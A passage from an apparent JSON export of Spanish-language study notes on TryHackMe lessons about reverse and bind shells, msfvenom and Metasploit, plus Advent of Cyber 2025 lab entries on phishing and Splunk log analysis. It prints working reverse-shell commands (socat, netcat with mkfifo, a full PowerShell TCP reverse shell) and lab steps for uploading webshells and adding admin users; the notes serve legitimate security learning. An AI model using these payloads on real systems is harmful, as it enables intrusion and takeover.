cualquier payload. Sin embargo, este listener especial necesita ser activado a trav√©s de un comando de listener espec√≠fico. Para que esto funcione, la m√°quina objetivo debe tener socat instalado, lo que no siempre pasa. Por suerte esto se puede remediar subiendo a la m√°quina un [binario precompilado de socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true).\n\nEl comando especial es as√≠:\n\n`socat TCP:<ip_atacante>:<puerto_atacante> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane`\n\nVamos a ver qu√© significa:\n\n- `pty`: Reserva un pseudoterminal en el objetivo.\n- `stderr`: Se asegura de que cualquier mensaje de error se muestre en la shell.\n- `sigint`: Crea un proceso en una nueva sesi√≥n.\n- `sane`: Estabiliza la terminal intentando normalizarla.\n\nVeamos un ejemplo. En la parte izquierda tenemos un listener corriendo en nuestra m√°quina local y a la derecha una simulaci√≥n del objetivo comprometido.\n\n>[!IMPORTANT] La shell de socat es totalmente interactiva, lo que facilita mucho la explotaci√≥n posterior.\n\n![[Pasted image 20251124173926.png]]\n\n>[!TIP] Si no funciona bien, conviene a√±adir `-d -d` al comando para aumentar la verbosidad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "15. Windows Practice Box",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/15-windows-practice-box/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/15. Windows Practice Box.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "1. Prueba a activar la `php-reverse-shell`. ¬øFunciona?\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195020.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Activamos la shell y esperamos la conexi√≥n.\n\t   ![[Pasted image 20251125195423.png]]\n\t   **No se puede.**\n2. Sube una webshell y obt√©n una reverse shell usando Powershell.\n\t1. Subimos la shell.\n\t   ![[Pasted image 20251125195633.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125195258.png]]\n\t3. Cargamos la shell y le metemos el comando que vimos en la tarea 11.\n\t   ![[Pasted image 20251125195844.png]]\n\t4. Esperamos la conexi√≥n.\n\t   ![[Pasted image 20251125200010.png]]\n3. El servidor web est√° corriendo con permisos SYSTEM. Crea un nuevo usuario y a√±√°delo al grupo \"administrators\", luego inicia sesi√≥n por RDP o WinRM.\n\t1. A√±adimos el usuario nuevo y lo metemos al grupo de administradores.\n\t   ![[Pasted image 20251125200148.png]]\n\t2. Inicio sesi√≥n con RDP.\n\t   ![[Pasted image 20251125200457.png]]\n4. Experimenta usando socat y netcat para obtener reverse y bind shells en el objetivo Windows.\n\t1. Netcat reverse shell.\n\t   ![[Pasted image 20251125211653.png]]\n\t2. Vamos a probar socat.\n\t   ![[Pasted image 20251125211713.png]]\n\t   Tampoco va, pero pod√≠amos subir un socat en binario precompilado.\n\t3. Vamos a subirlo.\n\t   ![[Pasted image 20251125212356.png]]\n\t4. Ya lo tenemos en la m√°quina.\n\t   ![[Pasted image 20251125212702.png]]\n\t5. No nos deja.\n\t   ![[Pasted image 20251125213058.png]]\n\t6. Puede que tengamos que iniciar sesi√≥n como administrador.\n\t   No era eso.\n\t7. Vamos a subir el siguiente archivo y lo llamaremos `reverse.ps1`:\n\n```powershell\n$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PUERTO>);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n$sendback = (iex $data 2>&1 | Out-String );\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$stream.Write($sendbyte,0,$sendbyte.Length);\n$stream.Flush();\n};\n$client.Close();\n```\n\n![[Pasted image 20251125214017.png]]\n6. Crea una shell Meterpreter Windows 64 bits usando msfvenom y s√∫belo al objetivo. Activa la shell y capt√∫rala con el multi/handler.\n\t1. Creamos el payload en msfvenom.\n\t   ![[Pasted image 20251126104631.png]]\n\t2. Lo subimos a la plataforma.\n\t   ![[Pasted image 20251126104646.png]]\n\t3. Nos ponemos en escucha con Metasploit.\n\t   ![[Pasted image 20251126104806.png]]\n\t4. Creamos un archivo que ejecute el archivo que hemos creado.\n\t   ![[Pasted image 20251126105011.png]]\n\t5. Lo subimos y lo ejecutamos.\n\t   ![[Pasted image 20251126105103.png]]\n\t6. No he conseguido estabilizarla de ninguna manera.\n\t   ![[Pasted image 20251126105358.png]]\n\t7. A ver si entrando como admin y ejecutando el c√≥digo. Para ello voy a crear otro `.exe` con un puerto diferente.\n\t\t1. Entramos con administrador.\n\t\t   ![[Pasted image 20251126113116.png]]\n\t\t2. Creamos y cargamos el nuevo archivo.\n\t\t   ![[Pasted image 20251126113344.png]]\n\t\t   ![[Pasted image 20251126113145.png]]\n\t\t3. Nos ponemos en escucha con multi/handler (antes debemos configurar el payload, como se ve en la √∫ltima foto).\n\t\t   ![[Pasted image 20251126113428.png]]\n\t\t4. Ejecutamos el c√≥digo.\n\t\t   ![[Pasted image 20251126113459.png]]\n\t\t5. Recibimos la shell.\n\t\t   ![[Pasted image 20251126114227.png]]\n\t\t6. Si escribimos help nos salen todos los comandos que podemos utilizar.\n\t\t   ![[Pasted image 20251126114408.png]]\n7. Crea una shell Meterpreter staged y uno stageless. Intenta capturarlas con netcat. ¬øFunciona?\n\t1. Creamos la stageless.\n\t   ![[Pasted image 20251126115925.png]]\n\t2. Creamos la staged.\n\t   ![[Pasted image 20251126115939.png]]\n\t3. Subimos las dos.\n\t   ![[Pasted image 20251126115658.png]]\n\t   ![[Pasted image 20251126115722.png]]\n\t4. Nos ponemos en escucha con `nc`.\n\t   ![[Pasted image 20251126120213.png]]\n\t\t1. La stageless s√≠ funciona.\n\t\t   ![[Pasted image 20251126120357.png]]\n\t\t2. La del staged no funciona, habr√≠a que capturarla con multi/handler.\n\t\t   ![[Pasted image 20251126121127.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Types of Shell",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/3-types-of-shell/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/3. Types of Shell.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "A alto nivel, estamos interesados en dos tipos de shell cuando se refiere a explotar un objetivo:\n\n- **Reverse shells:** Es cuando el objetivo es forzado a ejecutar c√≥digo que le conecta a nuestro ordenador. En nuestra m√°quina, configurar√≠amos un listener con alguna de las herramientas antes vistas, el cual recibir√≠a la conexi√≥n. Son una buena manera de sobrepasar reglas de firewall. Hacer esto a trav√©s de internet tiene la complicaci√≥n de que necesitas configurar tu propia red para que acepte esta shell.\n- **Bind shells:** Es cuando el c√≥digo ejecutado en la m√°quina se usa para abrir un listener en un puerto. Tiene la ventaja de que no tienes que hacer configuraciones extra en tu red. Sin embargo, puede ser prevenida debido a reglas de firewall.\n\n---------------------------\n<h2>Ejemplo de Reverse Shell</h2>\nNueve de cada diez veces ser√° la que usemos.\n\nMira la siguiente imagen. A la izquierda tenemos el listener. A la derecha la simulaci√≥n de mandar una reverse shell.\n\n![[Pasted image 20251123201348.png]]\n\n----------------------------\n<h2>Ejemplo de Bind Shell</h2>\nSon menos comunes pero muy √∫tiles tambi√©n. A la izquierda volvemos a tener la m√°quina del atacante y a la derecha la objetivo.\n\n![[Pasted image 20251123201439.png]]\n\n------------------------------------\nEl √∫ltimo concepto importante es el de interactividad.\n\nEn las shells interactivas, podemos ejecutar comandos como `ssh` para conectarnos a otra m√°quina. Sin embargo, en una shell no interactiva s√≥lo podremos introducir comandos como `whoami`, los cuales no necesitan una interacci√≥n del usuario.\n\nEn m√°quinas futuras veremos el comando `listener`. Este no existe por defecto, sino que es un alias configurado que apunta a `sudo rlwrap nc -lvnp 443`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Common Shell Payloads",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/8-common-shell-payloads/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/8. Common Shell Payloads.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Dentro de poco veremos c√≥mo generar payloads con msfvenom, pero antes de eso echemos un vistazo a algunos payloads comunes usando las herramientas que hemos visto.\n\n----------------------------------------\nEn algunas versiones de netcat, hay una opci√≥n `-e` que permite ejecutar un proceso en conexi√≥n, por ejemplo:\n\n`nc -lvnp <puerto> -e /bin/bash`\n\nConectarse al listener de arriba tendr√≠a como resultado una bind shell en el objetivo.\n\nIgualmente, conectarse de vuelta a `nc <ip_local> <puerto> -e /bin/bash` resultar√≠a en una reverse shell en el objetivo.\n\n En Windows, donde se requiere un binario est√°tico, esta t√©cnica funcionar√≠a perfectamente. Sin embargo, en Linux usar√≠amos el siguiente c√≥digo para crear un listener para una bind shell:\n \n`mkfifo /tmp/f; nc -lvnp <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\n\nEste comando:\n\n1. Primero crea una \"named pipe\", que es un m√©todo de comunicaci√≥n bidireccional entre procesos, en `/tmp/f`.\n2. Luego crea un listener netcat y conecta el input del listener al output de la named pipe.\n3. El output del listener se pipea (redirige) hacia `sh`, mandando el output est√°ndar de errores (stderr) a stdout.\n4. Manda stdout por el input de la named pipe, completando el c√≠rculo.\n\n![[Pasted image 20251124230612.png]]\n\nUn comando muy similar puede ser usado para mandar una reverse shell de netcat:\n\n`mkfifo /tmp/f; nc <ip_local> <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\n\nEste comando es virtualmente id√©ntico al de arriba (menos por usar la sintaxis de listen de netcat).\n\n![[Pasted image 20251124230849.png]]\n\n----------------------------------\nAl atacar Server de Windows moderno, es muy com√∫n necesitar una reverse shell de Powershell, as√≠ que lo cubriremos ahora (PSH reverse shell en una l√≠nea).\n\nEste comando es muy complejo por lo que no veremos aqu√≠ su funcionamiento. Sin embargo, es √∫til tenerlo a mano.\n\n`powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"`\n\nPara usarlo debemos reemplazar `<IP>` y `<port>`. Despu√©s lo copiamos a una cmd.exe u otras formas de ejecutar comandos en un Windows Server, como webshell. Por √∫ltimo lo ejecutamos.\n\n![[Pasted image 20251124231408.png]]\n\n---------------------------------------\nPara m√°s payloads de reverse shell, puedes visitar [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Es un repositorio que contiene muchas en varios lenguajes.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is a Shell",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/1-what-is-a-shell/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/1. What is a Shell.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Antes de entrar en detalle a cerca de mandar y recibir shells, es importante entender lo que es una shell. En los t√©rminos m√°s simples, las shells son lo que usamos para interactuar con el entorno de linea de comandos. En Linux, las m√°s comunes son bash o sh mientras que en Windows son cmd.exe y Powershell.\n\nPara obtener una shell  del servidor en nuestra m√°quina, podemos conseguirlo de dos maneras:\n\n1. Mandando una shell desde el servidor a nuestra m√°quina (s√≥lo si podemos inyectar comandos en el servidor), se conoce como reverse shell.\n2. Abriendo un puerto para que escuche y conect√°ndonos a √©l (bind shell).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. msfvenom",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/9-msfvenom/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/9. msfvenom.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Msfvenom: La tienda √∫nica para todo lo relacionado con payloads.\n\nParte del framework de Metasploit, msfvenom se usa para generar c√≥digo para reverse y bind shells. Se usa extensivamente en el desarrollo de exploits a bajo nivel (cercano a lenguaje m√°quina, no \"f√°cil\") para generar c√≥digo shell hexadecimal al desarrollar un exploit como un buffer overflow. Sin embargo, tambi√©n puede usarse para generar payloads en varios formatos (`.exe`, `.aspx`, `.py`, `.war`, etc.).\n\nLa sintaxis est√°ndar es:\n\n`msfvenom -p <payload> <opciones>`\n\nPor ejemplo, para generar una reverse shell x64 de Windows en formato `.exe`, usamos:\n\n`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ip_escucha> LPORT=<puerto_escucha>`\n\n![[Pasted image 20251125112430.png]]\n\n- `-f`: Especifica el formato.\n- `-o`: Especifica el nombre/ruta del proyecto final.\n- `LHOST`: Especifica la direcci√≥n IP de la m√°quina del atacante (reverse shell).\n- `LPORT`: Especifica el puerto en escucha de la m√°quina del atacante.\n\n-------------------------------------------\n<h2>Staged vs Stageless</h2>\nAntes de ir m√°s all√°, hay otros dos conceptos que debemos introducir: payloads de reverse shells **staged** y payloads de reverse shell **stageless**.\n\n- **Staged:** Los payloads staged **se mandan en dos partes**. La primera parte se llama stager. Es una pieza de c√≥digo que se ejecuta directamente en la m√°quina atacada. Se conecta al listener que espera pero no contiene c√≥digo de reverse shell, sino que se conecta al listener y usa la conexi√≥n para cargar el payload real. De esta manera evita ser cargada en disco, donde podr√≠a ser detectada por anti-virus convencionales. Este tipo de payloads suele requerir un listener especial, como `multi/handler` de Metasploit.\n- **Stageless:** los payloads stageless **se mandan en una sola parte**. Son m√°s comunes, y los que hemos estado usando hasta el momento. En cuanto lo ejecutamos se manda una shell de vuelta al listener.\n\nLos payloads stageless tienden a ser m√°s f√°ciles de usar y capturar. Sin embargo, tambi√©n son m√°s grandes y m√°s f√°cil para un antivirus detectarlos. Aunque tradicionalmente los payloads staged ten√≠an ventaja frente a los stageless por se menos detectables, los antivirus modernos comprueban la cargada en memoria por lo que estos han perdido valor.\n\n--------------------------------------------\n<h2>Meterpreter</h2>\nHablando de Metasploit, hay otra cosa importante de la que hablar, la Meterpreter shell. Estas son las consolas propias, con amplias funcionalidades integradas de Metasploit. Son completamente estables, haci√©ndolas una muy buena opci√≥n para trabajar con objetivos Windows. Si queremos usar alguna de las herramientas post-explotaci√≥n de Metasploit necesitamos una shell Meterpreter. El √∫nico \"pero\" de estas shells es que necesitan ser capturadas en Metasploit.\n\n-----------------------------------------------\n<h2>Convenciones de Nombramiento de Payloads</h2>\nAl trabajar con msfvenom, es importante entender c√≥mo funciona el sistema de nombramiento.\n\nLa convenci√≥n b√°sica es:\n\n`<OS>/<arch>/<payload>`\n\nPor ejemplo:\n\n`linux/x86/shell_reverse_tcp`\n\nEsto generaria una reverse shell para un objetivo Linux x86.\n\nLa excepci√≥n a esta convenci√≥n es Windows de 32 bits, para los cuales no se especifica la arquitectura:\n\n`windows/shell_reverse_tcp`\n\nDesglosemos ahora un poco la parte del payload. \n\nEn los ejemplos de arriba hemos usado `shell_reverse_tcp`. Esto indica que es un payload **stageless**. Estos se denotan con `_`. Si quisi√©ramos denotar un payload staged, ser√≠a:\n\n`shell/reverse_tcp`\n\nTodos los payloads staged se denotan con `/`.\n\n----------------------------------------------\nA parte de la p√°gina de manual de `msfconsole`, lo m√°s importante de saber cuando trabajamos con msfvenom es:\n\n`msfvenom --list payloads`\n\nEsto puede usarse para listar todos los payloads disponibles, que pueden ser pipeados a `grep` para buscar un set de payloads espec√≠ficos.\n\nPor ejemplo:\n\n![[Pasted image 20251125120730.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. What the Shell",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/0-what-the-shell/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/0. What the Shell.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "[[1. What is a Shell]]\n[[2. Tools]]\n[[3. Types of Shell]]\n[[4. Netcat]]\n[[5. Netcat Shell Stabilisation]]\n[[6. Socat]]\n[[7. Socat Encrypted Shells]]\n[[8. Common Shell Payloads]][[9. msfvenom]]\n[[10. Metasploit multi-handler]]\n[[11. Webshells]][[12. Next Steps]]\n[[13. Practice and Examples]]\n[[14. Linux Practice Box]]\n[[15. Windows Practice Box]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2025",
    "path": "/apuntes/thm/advent-of-cyber/2025/2025/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/2025.md",
    "breadcrumb": "THM > Advent of Cyber > 2025",
    "content": "1. [[1. Day 1]]\n2. [[1. Day 2]]\n3. [[1. Day 3]]\n4.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Day 2",
    "path": "/apuntes/thm/advent-of-cyber/2025/2-day-2/1-day-2/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/2. Day 2/1. Day 2.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 2. Day 2",
    "content": "[[0. Day 2 Machine]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Day 3",
    "path": "/apuntes/thm/advent-of-cyber/2025/3-day-3/1-day-3/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/3. Day 3/1. Day 3.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 3. Day 3",
    "content": "[[0. Day 3 Machine]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Day 1",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/1-day-1/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/1. Day 1.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1",
    "content": "1. [[0. Day 1 Machine]]\n2. [[2. Side Quest 1]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Day 2 Machine",
    "path": "/apuntes/thm/advent-of-cyber/2025/2-day-2/1-day-2-machine/0-day-2-machine/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/2. Day 2/1. Day 2 Machine/0. Day 2 Machine.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 2. Day 2 > 1. Day 2 Machine",
    "content": "[[Ciberseguridad/THM/Advent of Cyber/2025/2. Day 2/1. Day 2 Machine/1. Introduction]]\n[[2. Phishing Exercise for TBFC]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/advent-of-cyber/2025/2-day-2/1-day-2-machine/1-introduction/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/2. Day 2/1. Day 2 Machine/1. Introduction.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 2. Day 2 > 1. Day 2 Machine",
    "content": "![[Pasted image 20251203112421.png]]\n\nEn vista de varias amenazas de ciberseguridad recientes contra TBFC, el red team local ha programado varios tests de penetraci√≥n. Los intengrantes del red team llevan a cabo un pentest contra TBFC. Parte de este ejercicio es asegurarse de que los empleados son cuidadosos al hacer click en links y que la compa√±√≠a est√° bien protegida contra los √∫ltimos ataques de phishing.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Phishing Exercise for TBFC",
    "path": "/apuntes/thm/advent-of-cyber/2025/2-day-2/1-day-2-machine/2-phishing-exercise-for-tbfc/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/2. Day 2/1. Day 2 Machine/2. Phishing Exercise for TBFC.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 2. Day 2 > 1. Day 2 Machine",
    "content": "1. Descargamos, descomprimimos y ponemos en la misma carpeta los archivos dados.\n   ![[Pasted image 20251203114717.png]]\n2. Usamos `sudo setoolkit` para elaborar el correo de phishing. Primero le damos al 1 para seleccionar Ataque de Ingenier√≠a Social y luego:\n   ![[Pasted image 20251203115641.png]]\n3. Abrimos el servidor.\n   ![[Pasted image 20251203115229.png]]\n   Ahora se puede ver el portal de inicio:\n   ![[Pasted image 20251203115446.png]]\n4. Seguimos configurando el ataque.\n   ![[Pasted image 20251203120417.png]]\n5. Esperamos por las credenciales.\n   ![[Pasted image 20251203120626.png]]\n6. Navegamos a la p√°gina real.\n   ![[Pasted image 20251203120815.png]]\n7. Vamos a ver si se ha usado la misma contrase√±a para `factory`.\n   ![[Pasted image 20251203120851.png]]\n   Parece que s√≠.\n   ![[Pasted image 20251203120910.png]]\n8. Buscamos cu√°ntos juguetes van a entregarse.\n   ![[Pasted image 20251203121113.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/advent-of-cyber/2025/3-day-3/1-day-3-machine/1-introduction/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/3. Day 3/1. Day 3 Machine/1. Introduction.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 3. Day 3 > 1. Day 3 Machine",
    "content": "![[Pasted image 20251205175200.png]]\n\nCasi es Navidad en Wareville y el equipo de TBFC est√° ocupado prepar√°ndose para la gran celebraci√≥n. Todo est√° yendo sobre ruedas hasta que el dashboard del SOC se pone de color rojo y un mensaje de rescate aparece: \n\n![[Pasted image 20251205175330.png]]\n\nEl mensaje viene de King Malhare, el celoso dominador de la isla HopSec, que est√° cansado de que la pascua sea olvidada. Ha mandado a sus Bandit Bunnies que ataquen los sistemas de la compa√±√≠a y convertir la Navidad en la pascu-idad.\n\nCon McSkidy desaparecida y la red bajo ataque, el SOC de TBFC tendr√° que usar Splunk para determinar c√≥mo el ransomware se infiltr√≥ en el sistema y evitar el plan de King Malhare.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Day 3 Machine",
    "path": "/apuntes/thm/advent-of-cyber/2025/3-day-3/1-day-3-machine/0-day-3-machine/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/3. Day 3/1. Day 3 Machine/0. Day 3 Machine.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 3. Day 3 > 1. Day 3 Machine",
    "content": "[[Ciberseguridad/THM/Advent of Cyber/2025/3. Day 3/1. Day 3 Machine/1. Introduction]]\n[[2. Analysing Logs with Splunk]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Analysing Logs with Splunk",
    "path": "/apuntes/thm/advent-of-cyber/2025/3-day-3/1-day-3-machine/2-analysing-logs-with-splunk/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/3. Day 3/1. Day 3 Machine/2. Analysing Logs with Splunk.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 3. Day 3 > 1. Day 3 Machine",
    "content": "1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251207214052.png]]\n2. Le damos a \"Search and Reporting\".\n   ![[Pasted image 20251207214159.png]]\n3. All√≠ intentaremos ver los logs. Para ellos escribimos `index=main`, seleccionamos a`all time` a la derecha y le damos a buscar.\n   ![[Pasted image 20251207214432.png]]\n4. Si le damos a `sorcetype`, podemos ver los tipos de tr√°fico.\n   ![[Pasted image 20251207214653.png]]\n   Ahora mismo nos interesa el tr√°fico web, que es por donde seguramente entr√≥ el malware.\n5. Lo metemos en la query.\n   ![[Pasted image 20251207214948.png]]\n6. Si filtramos por d√≠as con `| timechart span=1d count` y le damos a \"Visualization\" podemos hacernos una idea de cu√°ndo ocurri√≥ el ataque.\n   ![[Pasted image 20251207221358.png]]\n   Podemos ver que parece empezar el 10 de Octubre.\n7. Para tener m√°s claro qu√© d√≠as debemos investigar, podemos ordenarlos de mayor a menor con `|sort by count` y `| reverse`. Vamos a \"Statistics\" y:\n   \n   ![[Pasted image 20251207221641.png]]\n   Podemos observar que los d√≠as 12, 10, 14, 11 y 13 son an√≥malos, con el d√≠a 12 siendo el que m√°s logs tiene.\n8. Ahora empezamos nuestra b√∫squeda de IoCs (Indicator of Compromise). Si le damos a \"Events\" de nuevo y luego a `user_agent`, podremos ver de donde viene el tr√°fico.\n   ![[Pasted image 20251208012837.png]]\n   Algunas como Mozilla son normales (de navegadores) pero `Havij` y `sqlmap` no.\n9. Ahora comprobamos las IPs d√°ndole a `client_ip`.\n   ![[Pasted image 20251208014421.png]]\n   Y vemos que claramente la proporci√≥n no tiene sentido por lo que podemos intuir de qu√© IP provienen el ataque.\n10. Si comprobamos `paths`, podemos ver las rutas que se intentaron acceder.\n    ![[Pasted image 20251208014607.png]]\n    Vemos a bote pronto intentos de Path Traversal y de de SQLi.\n11. Para asegurarnos, podemos filtrar aquellos navegadores comunes.\n    ![[Pasted image 20251208015343.png]]\n    Y efectivamente, corroboramos que es todo el ataque proveniente de la misma direcci√≥n IP, sospechoso...\n12. Para ver los mayores ejecutores de logs de otra manera m√°s r√°pida (si hubiera muchos) podr√≠amos hacer lo siguiente:\n    ![[Pasted image 20251208015638.png]]\n13. Para examinar los logs del firewall tenemos que cambiar el `sourcetype`, a√±adir la direcci√≥n de salida (nuestro servidor) la de destino (la del atacante) y establecer el filtro de opci√≥n permitida. Adem√°s debemos aplicar los campos que se mostrar√°n en la tabla.\n    ![[Pasted image 20251208021654.png]]\n14. Ahora agruparemos dichos bytes para ver cu√°nto se ha exfiltrado. Para ello eliminamos la tabla y aplicamos un sumatorio de los bytes con `stats sum()`.\n    ![[Pasted image 20251208021834.png]]\n\nY",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/1-day-1-machine/1-introduction/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/1. Day 1 Machine/1. Introduction.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 1. Day 1 Machine",
    "content": "![[Pasted image 20251203002916.png]]\n\nLo impensable ha ocurrido: McSkidy ha sido secuestrada. Sin ella, las defensas de Wareville se est√°n tambaleando y la navidad pende de un hilo. Pero entrar en p√°nico no salvar√° la navidad. Un largo camino yace delante para descubrir qu√© fue lo que pas√≥. El equipo TBFC (The Best Festival Company) ya ha pensado qu√© hacer, apuntando al servidor **tbfc-web01**, el cual procesa las listas de deseos.\n\n![[Pasted image 20251203003230.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Day 1 Machine",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/1-day-1-machine/0-day-1-machine/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/1. Day 1 Machine/0. Day 1 Machine.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 1. Day 1 Machine",
    "content": "[[Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/1. Day 1 Machine/1. Introduction]]\n[[2. Linux CLI]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Linux CLI",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/1-day-1-machine/2-linux-cli/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/1. Day 1 Machine/2. Linux CLI.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 1. Day 1 Machine",
    "content": "1. ¬øQu√© comando de CLI te permite listar un directorio?\n   `ls`\n2. ¬øQu√© flag encontraste en la gu√≠a de Mc Skidy?\n   ![[Pasted image 20251203003848.png]]\n3. ¬øQu√© comando te ayud√≥ a filtrar los logs?\n   `grep`\n4. ¬øQu√© flag dej√≥ Sir Carrotbane en el historial de bash de root?\n   ![[Pasted image 20251203004102.png]]\n5. ¬øQu√© comando usaste para cambiar al usuario root?\n   `sudo su`\n6. Para aquellos que se consideren intermedios, hay otro reto: Comprueba la nota escondida en `/home/mcskidy/Documents/` para obtener acceso a la clave para la **Side Quest 1**. \n   ![[Pasted image 20251203004446.png]]\n   Accesible a trav√©s del [Side Quest Hub](https://tryhackme.com/adventofcyber25/sidequest).\n   ![[Pasted image 20251203004513.png]]\n   \n   >[!IMPORTANT] Para seguir viendo esta Side Quest viaja a **1. Day 1 -> 2. Side Quest 1 -> 1. Flag Discovery**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Side Quest 1",
